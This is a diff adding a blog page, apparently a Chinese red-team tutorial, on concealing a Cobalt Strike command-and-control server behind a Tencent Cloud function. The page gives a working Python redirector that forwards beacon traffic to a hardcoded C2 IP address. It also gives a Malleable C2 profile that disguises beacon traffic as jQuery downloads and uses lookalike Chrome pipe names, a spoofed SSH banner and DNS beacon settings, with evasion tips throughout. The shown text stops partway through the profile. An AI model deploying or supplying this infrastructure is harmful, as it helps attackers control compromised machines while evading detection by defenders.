@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="腾讯云函数致谢： [新版腾讯云函数隐藏C2--续《保姆级教程：谁说腾讯云API 网关触发器功能下线之后就没法用来隐藏C2了](https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;1tja-ttj1E2pq-wj7aMclA)  新建函数服务 ‍ # -*- coding: utf-8 -*-  import json import requests  def main_handler(event">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云函数之腾讯云">
+<meta property="og:url" content="https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/index.html">
+<meta property="og:site_name" content="3inter&#39;s Blog">
+<meta property="og:description" content="腾讯云函数致谢： [新版腾讯云函数隐藏C2--续《保姆级教程：谁说腾讯云API 网关触发器功能下线之后就没法用来隐藏C2了](https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;1tja-ttj1E2pq-wj7aMclA)  新建函数服务 ‍ # -*- coding: utf-8 -*-  import json import requests  def main_handler(event">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://3inter.net/assets/image-20250921232453-hu7zz5a.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250922161215-fua5jmu.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250922160951-lzmaanz.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250922162643-wa9233f.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250922162804-fmrs1yl.png">
+<meta property="article:published_time" content="2025-09-22T08:48:01.000Z">
+<meta property="article:modified_time" content="2025-09-22T08:58:02.987Z">
+<meta property="article:author" content="3inter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://3inter.net/assets/image-20250921232453-hu7zz5a.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>云函数之腾讯云</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">3inter&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/09/17/Splunk-%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&text=云函数之腾讯云"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&is_video=false&description=云函数之腾讯云"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=云函数之腾讯云&body=Check out this article: https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&name=云函数之腾讯云&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">腾讯云函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E5%87%BD%E6%95%B0%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">新建函数服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E7%9B%91%E5%90%AC%E5%99%A8%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">CS监听器配置：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">效果：</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        云函数之腾讯云
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">3inter's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2025-09-22T08:48:01.000Z" itemprop="datePublished">2025-09-22</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="腾讯云函数"><a href="#腾讯云函数" class="headerlink" title="腾讯云函数"></a>腾讯云函数</h1><p><strong>致谢：</strong></p>
+<pre><code>[新版腾讯云函数隐藏C2--续《保姆级教程：谁说腾讯云API 网关触发器功能下线之后就没法用来隐藏C2了](https://mp.weixin.qq.com/s/1tja-ttj1E2pq-wj7aMclA)
+</code></pre>
+<h2 id="新建函数服务"><a href="#新建函数服务" class="headerlink" title="新建函数服务"></a>新建函数服务</h2><p><img src="/assets/image-20250921232453-hu7zz5a.png" alt="image"><img src="/assets/image-20250922161215-fua5jmu.png" alt="image"></p>
+<p>‍</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> requests
+
+<span class="token keyword">def</span> <span class="token function">main_handler</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    C2 <span class="token operator">=</span> <span class="token string">'https://139.199.157.125:443'</span>
+    path <span class="token operator">=</span> event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+    headers <span class="token operator">=</span> event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'headers'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    method <span class="token operator">=</span> event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'httpMethod'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Incoming event:"</span><span class="token punctuation">,</span>event<span class="token punctuation">)</span>
+    
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
+            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>C2 <span class="token operator">+</span> path<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>C2 <span class="token operator">+</span> path<span class="token punctuation">,</span> data<span class="token operator">=</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+        
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Response headers:"</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+            
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Response content:"</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
+            
+        <span class="token comment"># Return raw response body(no base64),decode to string for JSON transport</span>
+        
+        response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
+            <span class="token string">"statusCode"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>
+            <span class="token string">"headers"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>
+                <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token string">"body"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token comment"># decode raw bytes for text-based response</span>
+        <span class="token punctuation">&#125;</span>
+    
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span><span class="token boolean">False</span><span class="token punctuation">,</span>
+            <span class="token string">"statusCode"</span><span class="token punctuation">:</span> <span class="token number">502</span><span class="token punctuation">,</span>
+            <span class="token string">"headers"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>
+                <span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"text/plain"</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token string">"body"</span><span class="token punctuation">:</span><span class="token string">"Upstream request failed:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> response
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>‍</p>
+<p>Modify自<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/threatexpress/malleable-c2/refs/heads/master/jquery-c2.4.9.profile">https://raw.githubusercontent.com/threatexpress/malleable-c2/refs/heads/master/jquery-c2.4.9.profile</a></p>
+<pre class="line-numbers language-none"><code class="language-none"># Malleable C2 Profile
+# Version: CobaltStrike 4.9
+# File: jquery-c2.4.9.profile
+# Description: 
+#    c2 profile attempting to mimic a jquery.js request
+#    uses signed certificates
+#    or self-signed certificates
+# Authors: @joevest, @andrewchiles, @001SPARTaN, @Charles-Foster-Kane
+
+################################################
+## Tips for Profile Parameter Values
+################################################
+## 1st, RTFM
+## https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;support&#x2F;
+##
+## Parameter Values
+## Enclose parameter in Double quote, not single
+##      set useragent &quot;SOME AGENT&quot;;   GOOD
+##      set useragent &#39;SOME AGENT&#39;;   BAD
+
+## Some special characters do not need escaping 
+##      prepend &quot;!@#$%^&amp;*()&quot;;
+
+## Semicolons are ok
+##      prepend &quot;This is an example;&quot;;
+
+## Escape Double quotes
+##      append &quot;here is \&quot;some\&quot; stuff&quot;;
+
+## Escape Backslashes 
+##      append &quot;more \\ stuff&quot;;
+
+## HTTP Values
+## Program .http-post.client must have a compiled size less than 252 bytes.
+
+################################################
+## Profile Name
+################################################
+## Description:
+##    The name of this profile (used in the Indicators of Compromise report)
+## Defaults:
+##    sample_name: My Profile
+## Guidelines:
+##    - Choose a name that you want in a report
+set sample_name &quot;jQuery CS 4.9 Profile&quot;;
+
+################################################
+## Sleep Times
+################################################
+## Description:
+##    Timing between beacon check in
+## Defaults:
+##    sleeptime: 60000
+##    jitter: 0
+## Guidelines:
+##    - Beacon Timing in milliseconds (1000 &#x3D; 1 sec)
+set sleeptime &quot;6916&quot;;         # 45 Seconds
+#set sleeptime &quot;300000&quot;;       # 5 Minutes
+#set sleeptime &quot;600000&quot;;      # 10 Minutes
+#set sleeptime &quot;900000&quot;;      # 15 Minutes
+#set sleeptime &quot;1200000&quot;;      # 20 Minutes
+#set sleeptime &quot;1800000&quot;;      # 30 Minutes
+#set sleeptime &quot;3600000&quot;;      # 1 Hours
+set jitter    &quot;37&quot;;            # % jitter
+
+################################################
+##  Server Response Size jitter
+################################################
+##  Description:
+##   Append random-length string (up to data_jitter value) to http-get and http-post server output.
+set data_jitter &quot;77&quot;;          
+
+################################################
+##  HTTP Client Header Removal
+################################################
+##  Description:
+##      Global option to force Beacon&#39;s WinINet to remove specified headers late in the HTTP&#x2F;S transaction process.
+## Value:
+##      headers_remove              Comma-separated list of HTTP client headers to remove from Beacon C2.
+# set headers_remove &quot;Strict-Transport-Security, header2, header3&quot;;
+
+################################################
+## Beacon User-Agent
+################################################
+## Description:
+##    User-Agent string used in HTTP requests, CS versions &lt; 4.2 approx 128 max characters, CS 4.2+ max 255 characters
+## Defaults:
+##    useragent: Internet Explorer (Random)
+## Guidelines
+##    - Use a User-Agent values that fits with your engagement
+##    - useragent can only be 128 chars
+## IE 10
+# set useragent &quot;Mozilla&#x2F;5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident&#x2F;6.0; en-IN)&quot;;
+## MS IE 11 User Agent
+set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.3; Trident&#x2F;7.0; rv:11.0) like Gecko&quot;;
+
+################################################
+## SSL CERTIFICATE
+################################################
+## Description:
+##    Signed or self-signed TLS&#x2F;SSL Certifcate used for C2 communication using an HTTPS listener
+## Defaults:
+##    All certificate values are blank
+## Guidelines:
+##    - Best Option - Use a certifcate signed by a trusted certificate authority
+##    - Ok Option - Create your own self signed certificate
+##    - Option - Set self-signed certificate values
+https-certificate &#123;
+    
+    ## Option 1) Trusted and Signed Certificate
+    ## Use keytool to create a Java Keystore file. 
+    ## Refer to https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-malleable-c2#validssl
+    ## or https:&#x2F;&#x2F;github.com&#x2F;killswitch-GUI&#x2F;CobaltStrike-ToolKit&#x2F;blob&#x2F;master&#x2F;HTTPsC2DoneRight.sh
+   
+    ## Option 2) Create your own Self-Signed Certificate
+    ## Use keytool to import your own self signed certificates
+
+    set keystore &quot;azure.store&quot;;
+    set password &quot;123456&quot;;
+
+    ## Option 3) Cobalt Strike Self-Signed Certificate
+    set C   &quot;CN&quot;;
+    set CN  &quot;jquery.com&quot;;
+    set O   &quot;jQuery&quot;;
+    set OU  &quot;Certificate Authority&quot;;
+    set validity &quot;365&quot;;
+&#125;
+
+################################################
+## Task and Proxy Max Size
+################################################
+## Description:
+##    Added in CS4.6
+##    Control how much data (tasks and proxy) is transferred through a communication channel
+## Defaults:
+##    tasks_max_size &quot;1048576&quot;;         # 1 MB
+##    tasks_proxy_max_size &quot;921600&quot;;    # 900 KB
+##    tasks_dns_proxy_max_size &quot;71680&quot;; # 70 KB
+## Guidelines
+##    - For tasks_max_size determine the largest task that will be sent to your target(s).
+##      This setting is patched into beacon when it is generated, so the size
+##      needs to be determined prior to generating beacons for your target(s).
+##      If a beacon within a communication chain does not support the received task size
+##      it will be ignored.
+##    - It is recommended to not modify the proxy max sizes
+##
+set tasks_max_size &quot;2097152&quot;; # Changed to 2 MB to support larger assembly files
+set tasks_proxy_max_size &quot;921600&quot;;
+set tasks_dns_proxy_max_size &quot;71680&quot;;  
+
+################################################
+## HTTP Beacon
+################################################
+## Description:
+##   Allows you to specify attributes for general attributes for the http(s) beacons.
+## Values:
+##    library       wininet             CS 4.9 - The library attribute allows user to specify the default library used by the generated beacons used by the profile. The library defaults to &quot;wininet&quot;, which is the only type of beacon prior to version 4.9. The library value can be &quot;wininet&quot; or &quot;winhttp&quot;.
+##
+http-beacon &#123;
+    # Change the default HTTP Beacon library type used by the generated beacons
+    set library &quot;winhttp&quot;;
+&#125;
+
+################################################
+## TCP Beacon
+################################################
+## Description:
+##    TCP Beacon listen port
+##     - https:&#x2F;&#x2F;blog.cobaltstrike.com&#x2F;2019&#x2F;01&#x2F;02&#x2F;cobalt-strike-3-13-why-do-we-argue&#x2F;
+##     - https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-tcp-beacon
+##    TCP Frame Header
+##     - Added in CS 4.1, prepend header to TCP Beacon messages
+## Defaults:
+##    tcp_port: 4444
+##    tcp_frame_header: N\A
+## Guidelines
+##    - OPSEC WARNING!!!!! The default port is 4444. This is bad. You can change dynamicaly but the port set in the profile will always be used first before switching to the dynamic port.
+##    - Use a port other that default. Choose something not is use.
+##    - Use a port greater than 1024 is generally a good idea
+set tcp_port &quot;42585&quot;;
+set tcp_frame_header &quot;\x80&quot;;
+
+################################################
+## SMB beacons
+################################################
+## Description:
+##    Peer-to-peer beacon using SMB for communication
+##    SMB Frame Header
+##     - Added in CS 4.1, prepend header to SMB Beacon messages
+## Defaults:
+##    pipename: msagent_##
+##    pipename_stager: status_##
+##    smb_frame_header: N\A
+## Guidelines:
+##    - Do not use an existing namedpipe, Beacon doesn&#39;t check for conflict!
+##    - the ## is replaced with a number unique to a teamserver     
+## ---------------------
+set pipename         &quot;mojo.5688.8052.183894939787088877##&quot;; # Common Chrome named pipe
+set pipename_stager  &quot;mojo.5688.8052.35780273329370473##&quot;; # Common Chrome named pipe
+set smb_frame_header &quot;\x80&quot;;
+
+################################################
+## DNS beacons
+################################################
+## Description:
+##    Beacon that uses DNS for communication
+## Defaults:
+##    dns_idle: 0.0.0.0
+##    dns_max_txt: 252
+##    dns_sleep: 0
+##    dns_stager_prepend: N&#x2F;A
+##    dns_stager_subhost: .stage.123456.
+##    dns_ttl: 1
+##    maxdns: 255
+##    beacon: N&#x2F;A
+##    get_A:  cdn.
+##    get_AAAA: www6.
+##    get_TXT: api.
+##    put_metadata: www.
+##    put_output: post.
+##    ns_reponse: drop
+## Guidelines:
+##    - DNS beacons generate a lot of DNS request. DNS beacon are best used as low and slow back up C2 channels
+dns-beacon &#123;
+    # Options moved into &quot;dns-beacon&quot; group in version 4.3
+    set dns_idle           &quot;74.125.196.113&quot;; #google.com (change this to match your campaign)
+    set dns_max_txt        &quot;252&quot;;
+    set dns_sleep          &quot;0&quot;; #    Force a sleep prior to each individual DNS request. (in milliseconds)
+    set dns_ttl            &quot;5&quot;;
+    set maxdns             &quot;255&quot;;
+    set dns_stager_prepend &quot;.resources.123456.&quot;;
+    set dns_stager_subhost &quot;.feeds.123456.&quot;;
+
+    # DNS subhosts override options, added in version 4.3
+    set beacon           &quot;a.bc.&quot;;
+    set get_A            &quot;b.1a.&quot;;
+    set get_AAAA         &quot;c.4a.&quot;;
+    set get_TXT          &quot;d.tx.&quot;;
+    set put_metadata     &quot;e.md.&quot;;
+    set put_output       &quot;f.po.&quot;;
+    set ns_response      &quot;zero&quot;;
+
+&#125;
+
+################################################
+## SSH beacons
+################################################
+## Description:
+##    Peer-to-peer SSH pseudo-Beacon for lateral movement
+##    ssh_banner
+##    - Added in Cobalt Strike 4.1, changes client SSH banner
+## Defaults:
+##    ssh_banner: Cobalt Strike 4.2
+set ssh_banner        &quot;OpenSSH_7.4 Debian (protocol 2.0)&quot;;
+set ssh_pipename      &quot;wkssvc##&quot;;
+
+################################################
+## Staging process
+################################################
+## OPSEC WARNING!!!! Staging has serious OPSEC issues. It is recommed to disable staging and use stageless payloads
+## Description:
+##    Malleable C2&#39;s http-stager block customizes the HTTP staging process
+## Defaults:
+##    uri_x86 Random String
+##    uri_x64 Random String
+##    HTTP Server Headers - Basic HTTP Headers
+##    HTTP Client Headers - Basic HTTP Headers
+## Guidelines:
+##    - Add customize HTTP headers to the HTTP traffic of your campaign
+##    - Only specify the &#96;Host&#96; header when peforming domain fronting. Be aware of HTTP proxy&#39;s rewriting your request per RFC2616 Section 14.23
+##      - https:&#x2F;&#x2F;blog.cobaltstrike.com&#x2F;2017&#x2F;02&#x2F;06&#x2F;high-reputation-redirectors-and-domain-fronting&#x2F;
+##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)
+
+#set host_stage &quot;false&quot;; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes
+set host_stage &quot;true&quot;; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
+
+http-stager &#123;  
+    set uri_x86 &quot;&#x2F;jquery-3.3.1.slim.min.js&quot;;
+    set uri_x64 &quot;&#x2F;jquery-3.3.2.slim.min.js&quot;;
+
+    server &#123;
+        header &quot;Server&quot; &quot;NetDNA-cache&#x2F;2.2&quot;;
+        header &quot;Cache-Control&quot; &quot;max-age&#x3D;0, no-cache&quot;;
+        header &quot;Pragma&quot; &quot;no-cache&quot;;
+        header &quot;Connection&quot; &quot;keep-alive&quot;;
+        header &quot;Content-Type&quot; &quot;application&#x2F;javascript; charset&#x3D;utf-8&quot;;
+        output &#123;
+            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+            # 2nd Line            
+            prepend &quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;&#x3D;&#x3D;typeof module&amp;&amp;\&quot;object\&quot;&#x3D;&#x3D;typeof module.exports?module.exports&#x3D;e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!&#x3D;typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n&#x3D;[],r&#x3D;e.document,i&#x3D;Object.getPrototypeOf,o&#x3D;n.slice,a&#x3D;n.concat,s&#x3D;n.push,u&#x3D;n.indexOf,l&#x3D;&#123;&#125;,c&#x3D;l.toString,f&#x3D;l.hasOwnProperty,p&#x3D;f.toString,d&#x3D;p.call(Object),h&#x3D;&#123;&#125;,g&#x3D;function e(t)&#123;return\&quot;function\&quot;&#x3D;&#x3D;typeof t&amp;&amp;\&quot;number\&quot;!&#x3D;typeof t.nodeType&#125;,y&#x3D;function e(t)&#123;return null!&#x3D;t&amp;&amp;t&#x3D;&#x3D;&#x3D;t.window&#125;,v&#x3D;&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o&#x3D;(t&#x3D;t||r).createElement(\&quot;script\&quot;);if(o.text&#x3D;e,n)for(i in v)n[i]&amp;&amp;(o[i]&#x3D;n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null&#x3D;&#x3D;e?e+\&quot;\&quot;:\&quot;object\&quot;&#x3D;&#x3D;typeof e||\&quot;function\&quot;&#x3D;&#x3D;typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b&#x3D;\&quot;3.3.1\&quot;,w&#x3D;function(e,t)&#123;return new w.fn.init(e,t)&#125;,T&#x3D;&#x2F;^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$&#x2F;g;w.fn&#x3D;w.prototype&#x3D;&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null&#x3D;&#x3D;e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t&#x3D;w.merge(this.constructor(),e);return t.prevObject&#x3D;this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t&#x3D;this.length,n&#x3D;+e+(e&lt;0?t:0);return this.pushStack(n&gt;&#x3D;0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return 